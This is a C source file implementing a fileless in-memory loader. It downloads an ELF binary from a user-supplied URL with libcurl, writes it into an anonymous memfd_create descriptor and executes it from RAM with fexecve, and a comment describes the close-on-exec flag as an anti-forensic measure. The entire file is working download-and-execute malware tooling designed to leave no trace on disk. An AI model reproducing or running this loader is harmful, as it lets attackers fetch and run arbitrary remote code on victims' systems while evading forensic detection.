#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <curl/curl.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001
/*
#define MFD_CLOEXEC 0x0001  ensures the file descriptor is automatically closed during exec() (e.g. fexecve); improves anti-forensic by preventing FD leaks into child processes
 */
#endif

// Wrapper for memfd_create syscall
int memfd_create(const char *name, unsigned int flags) {
    return syscall(SYS_memfd_create, name, flags);
}

// Structure used to store the downloaded ELF in memory
struct MemoryBuffer {
    char *data;     // pointer to the allocated buffer
    size_t size;    // current size of the buffer
};

// libcurl write callback: appends downloaded data to the memory buffer
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    struct MemoryBuffer *mem = (struct MemoryBuffer *)userdata;

    // Expand buffer size to fit new data
    char *tmp = realloc(mem->data, mem->size + total);
    if (!tmp) return 0;

    mem->data = tmp;
    memcpy(&(mem->data[mem->size]), ptr, total);  // append new chunk
    mem->size += total;  // update buffer size
    return total;
}

// Core function: download ELF binary from URL and execute it directly from RAM
int load_elf_from_url(const char *url) {
    CURL *curl = curl_easy_init();  // initialize libcurl
    if (!curl) return -1;

    struct MemoryBuffer bin = {0};  // initialize empty memory buffer

    // Configure curl with target URL and callback
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bin);
    CURLcode res = curl_easy_perform(curl);  // perform download
    curl_easy_cleanup(curl);  // clean up curl handle

    // Check if download succeeded and buffer is not empty
    if (res != CURLE_OK || bin.size == 0) {
        fprintf(stderr, "Failed to download binary.\n");
        free(bin.data);
        return -1;
    }

    // Create anonymous file in RAM
    int memfd = memfd_create("inmem", MFD_CLOEXEC);
    if (memfd < 0) {
        perror("memfd_create");
        free(bin.data);
        return -1;
    }

    // Write downloaded ELF content into in-memory file descriptor
    if (write(memfd, bin.data, bin.size) != bin.size) {
        perror("write to memfd");
        free(bin.data);
        close(memfd);
        return -1;
    }

    free(bin.data);  // free download buffer

    // Prepare arguments for fexecve
    char *argv[] = {"inmem_exec", NULL};
    char *envp[] = {NULL};

    // Execute binary from memory
    fexecve(memfd, argv, envp);

    // If execution returns, it's an error
    perror("fexecve");
    close(memfd);
    return -1;
}

// Entry point: expects one argument (URL to ELF binary)
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <url_to_ELF_binary>\n", argv[0]);
        return EXIT_FAILURE;
    }

    return load_elf_from_url(argv[1]);
}
